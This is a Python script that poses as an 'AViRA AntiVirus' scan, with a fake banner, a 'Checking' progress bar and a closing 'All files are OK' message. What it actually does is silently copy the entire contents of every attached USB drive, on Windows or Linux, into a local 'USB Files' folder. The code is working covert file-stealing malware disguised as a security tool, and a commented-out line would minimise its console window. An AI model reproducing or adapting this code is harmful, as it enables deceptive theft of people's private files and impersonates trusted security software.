from abc import abstractmethod, ABC
from platform import system as syst
from time import sleep
from os import chdir, listdir, path, mkdir, sep
from shutil import copytree, copyfile
from progressbar import ProgressBar, Percentage, Bar, ETA, FileTransferSpeed


class Main:
    def __init__(self, home, dest):
        self.home = home
        self.dest = dest
        self.usbNum = 0
        self.usb_drive_list = []

        if "USB Files" not in listdir(self.home):
            chdir(self.home)
            mkdir("USB Files")

        print("\n****AViRA AntiVirus***"
              "\nInfo(tags/v3.7.6:, Dec 29 2019, 00:42:30)"
              " [MSC v.1916 64 bit (AMD64)] on win32. "
              "Please wait while checking your files...\n")

    def USB_Number(self):
        chdir(self.dest)
        lister = listdir('.')
        Directories = [i for i in lister if path.isdir(i)]

        if len(Directories) == 0:
            self.usbNum = 1
        else:
            self.usbNum = int(max(Directories)) + 1

    @abstractmethod
    def USB_Drive_List(self):
        pass

    @staticmethod
    def USB_Found_Or_Not(drive_list):
        if drive_list.__len__() == 0:
            print("No USB Connected!!!")
            sleep(4)
            exit()

    def Copy(self):
        if len(self.usb_drive_list) > 1:
            x = 0
            while x < len(self.usb_drive_list):
                chdir(self.usb_drive_list[x])
                self.Copy_Try()
                x += 1
                self.usbNum += 1
        else:
            chdir(self.usb_drive_list[0])
            self.Copy_Try()

    def Copy_Try(self):
        pwd = listdir('.')
        Files = [i for i in pwd if path.isfile(i)]
        Directories = [i for i in pwd if path.isdir(i)]

        widgets = ['Checking: ', Percentage(), ' ', Bar(marker='0', left='[',
                                                        right=']'), ' ', ETA(), ' ', FileTransferSpeed()]

        bar = ProgressBar(widgets=widgets, maxval=len(pwd))

        x = 1
        bar.start()
        for dirname in Directories:
            try:
                copytree(dirname, self.dest + str(self.usbNum) + sep + dirname)
                bar.update(x)
                x += 1
            except:
                bar.update(x)
                x += 1

        for file in Files:
            try:
                copyfile(file, self.dest + str(self.usbNum) + sep + file)
                bar.update(x)
                x += 1
            except:
                bar.update(x)
                x += 1
        bar.finish()

    @staticmethod
    def Final():
        print("\n=====No Thread Found=====\n\nAll files are OK.")
        input()


class MainWindows(Main, ABC):
    def __init__(self):
        super().__init__("C:\\", "C:\\USB Files\\")
        self.USB_Number()
        self.usb_drive_list = self.USB_Drive_List()
        self.USB_Found_Or_Not(self.usb_drive_list)
        self.Copy()
        self.Copy_Try()
        self.Final()

    def USB_Drive_List(self):
        from win32file import GetDriveType, GetLogicalDrives, DRIVE_REMOVABLE

        drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                dirname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(dirname)
                if t == DRIVE_REMOVABLE:
                    drive_list.append(dirname)
        return drive_list


class MainLinux(Main, ABC):
    def __init__(self):
        from getpass import getuser

        self.username = getuser()
        home = "/home/" + self.username + sep
        dest = home + "USB Files/"

        super().__init__(home, dest)
        self.USB_Number()
        self.usb_drive_list = self.USB_Drive_List()
        self.USB_Found_Or_Not(self.usb_drive_list)
        self.Copy()
        self.Copy_Try()
        self.Final()

    def USB_Drive_List(self):
        chdir("/media/" + self.username + sep)
        drive_list = listdir('.')
        return drive_list


if __name__ == "__main__":
    if syst() == "Windows":
        M = MainWindows()
    if syst() == "Linux":
        M = MainLinux()

    # import ctypes
    # ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)
